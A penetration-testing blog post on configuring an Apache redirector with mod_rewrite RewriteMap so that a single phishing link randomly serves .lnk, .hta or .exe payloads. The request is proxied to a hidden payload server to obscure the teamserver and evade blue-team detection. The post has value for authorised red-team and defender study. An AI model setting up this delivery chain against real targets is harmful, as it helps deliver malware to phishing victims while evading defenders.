---
layout: post
title: Serving Random Payloads with Apache mod_rewrite
tags:
- mod_rewrite
- phishing
- red team infrastructure
image: /assets/mod_rewrite-random-payloads/diagram.png
commentIssueId: 24
---

As testers, we sometimes need some good, old-fashioned trial and error to get things working. Phishing is one of the attacks that commonly takes more than one attempt to get payloads and command and control (C2) working properly. This post covers how to help effectively perform payload trial and error by randomly serving payloads from one URL with Apache mod_rewrite.

The technique described in this post lends itself more to a penetration test, where email phishing batches may span an entire target company, rather than a red team assessment, where email phishing is highly targeted and payload issues are painstakingly troubleshot manually. Following the steps below, we can configure an Apache redirector, or server directly, to serve a random payload from a predefined list of possible payloads with the [RewriteMap - randomized plain text](http://httpd.apache.org/docs/current/rewrite/rewritemap.html#rnd) functionality of Apache.

Apache's RewriteMap function allows external programs, such as scripts, databases, or text files to remap requests for Apache to serve. The example commonly used in the official documentation is if a store changes from a URL structure of *item-1234* to *iPhone-7-white*, the web administrators could use Apache to serve up *iPhone-7-white* when *item-1234* is requested without having to change any hard coded links. RewriteMap provides a bulk method of translating these resource modifications. We will use RewriteMap to pull a random payload URI from a text file and return a 302 (temporary) redirection to cause the target to request the randomized payload file.

Here is a diagram of our attack workflow:

{% include image.html file="/assets/mod_rewrite-random-payloads/diagram.png" description="Random Payload Serving Diagram" %}

# Setup

Apache requires a few configuration changes to support mod_rewrite and RewriteMap. These are explained in detail under the first time setup section of my previous post [Strengthen Your Phishing with Apache mod_rewrite and Mobile User Redirection]({{site.baseurl}}/2016-03-22-strengthen-your-phishing-with-apache-mod_rewrite-and-mobile-user-redirection/). In short, modify the Apache configuration file, which is `/etc/apache2/apache2.conf` by default on most Debian-based distros, to allow htaccess rewriting by changing the following snippet to read **All** instead of **None**:

```bash
<Directory /var/www/>
        Options Indexes FollowSymLinks
        AllowOverride None
        Require all granted
</Directory>
```

If the web root of your redirector is a directory other than the default `/var/www/`, you will need to modify the corresponding Directory Context's *AllowOverride* setting.


Within the [server context](http://httpd.apache.org/docs/current/mod/directive-dict.html#Context) (such as the bottom) of the configuration file, we need to add the following text:

```bash
RewriteMap payloads "rnd:/var/www/payloads.txt"
```

This tells mod_rewrite that when we call the *payloads* variable with RewriteMap, pull entries from the path `/var/www/payloads.txt`. This file must be readable by Apache and should be stored outside the web root, which is `/var/www/html` in this example.

Create a file at `/var/www/payloads.txt` and enter the following text:

```bash
windows payload.lnk|payload.hta|payload.exe
```

In this example, *windows* is our key and *payload.lnk*, *payload.hta*, and *payload.exe* are our values. When RewriteMap is called on the payloads file and provided the *windows* key, a random value from the pipe separated list is returned. We can add a value multiple times to increase its likelihood of being returned. This file can be updated on the fly without needing to restart *apache2*. If you determine a certain payload doesn't work or stand up a new payload, you can freely modify the *payloads.txt* file.

Enable the needed mod_rewrite modules and restart *apache2* by running the following command as root:

```bash
a2enmod rewrite proxy proxy_http && service apache2 restart
```

The final configuration step is to set up our *htaccess* file. Create the file `/var/www/html/.htaccess` and place the following text within it:

<div style="background-color:rgb(39,40,34);color:rgb(248,248,242);font-size:.85em;overflow-x:scroll;white-space: nowrap;padding:6px;">
RewriteEngine On<br>
RewriteCond <span style="color: dodgerblue">%{REQUEST_URI}</span> <span style="color: mediumseagreen">^/payload</span><span style="color: mediumpurple">/?$</span><br>
RewriteRule <span style="color: gold">^.*$</span> <span style="color: orange">/${payloads:windows}</span> <span style="color: tomato">[L,R=302]</span><br>
RewriteCond <span style="color: dodgerblue">%{REQUEST_URI}</span> <span style="color: mediumseagreen">^/payload\.(exe|lnk|hta)</span><br>
RewriteRule <span style="color: gold">^.*$</span> <span style="color: orange">http://192.168.188.134</span><span style="color: dodgerblue">%{REQUEST_URI}</span> <span style="color: tomato">[P]</span>
</div>

Here's a line-by-line breakdown of that ruleset:

<div style="background-color:rgb(39,40,34);color:rgb(248,248,242);font-size:.85em;overflow-x:scroll;white-space: nowrap;padding:6px;">
Enable the rewrite engine<br>
<span style="color: dodgerblue">If the request’s URI</span> <span style="color: mediumseagreen">starts with ‘payload’</span> <span style="color: mediumpurple"> with an optional trailing slash at the end of the URI,</span><br>
<span style="color: gold">rewrite the entire request</span> <span style="color: orange">to a random value pulled from the RewriteMap file linked to "payloads" with the key "windows"</span> <span style="color: tomato">This is a temporary redirect and the last rule that should be evaluated/applied to the request.</span><br>
<span style="color: dodgerblue">If the request’s URI</span> <span style="color: mediumseagreen">starts with ‘payload’ and ends with the file extension exe, lnk, or hta,</span><br>
<span style="color: gold">rewrite the entire request</span> <span style="color: orange">to serve the </span><span style="color: dodgerblue"> request URI </span><span style="color: orange"> from IP 192.168.188.134 (the payload server IP), </span><span style="color: tomato">and keep the user's address bar the same (obscure the teamserver's IP).</span>
</div>

Now the server is fully configured. 

Here is a demo of the ruleset above randomly serving an executable file and then an HTML Application (HTA) file when a user visits `http://spoofdomain.com/payload` twice in a row:

{% include image.html file="/assets/mod_rewrite-random-payloads/demo.gif" description="Random Payload Serving Demo" %}

# Summary

Apache mod_rewrite provides pentesters and red teamers with a [wealth of options](https://bluescreenofjeff.com/tags#mod_rewrite) to strengthen their attack infrastructure and phishing campaigns. Techniques can be combined for greater effect to help gain more valuable information from the clicks you receive and help evade blue team detection and response. Randomly serving payloads to phishing targets can increase the likelihood of finding a payload that works on target and minimizes the risk of wasting valuable clicks.


{:#resources}

# Resources

* [mod-rewrite-cheatsheet.com](http://mod-rewrite-cheatsheet.com)
* [Official Apache 2.4 mod_rewrite Documentation](http://httpd.apache.org/docs/current/rewrite/)
	* [Apache mod_rewrite Introduction](https://httpd.apache.org/docs/2.4/en/rewrite/intro.html)
* [An In-Depth Guide to mod_rewrite for Apache](http://code.tutsplus.com/tutorials/an-in-depth-guide-to-mod_rewrite-for-apache--net-6708)
* [Red Team Infrastructure Wiki](https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki)
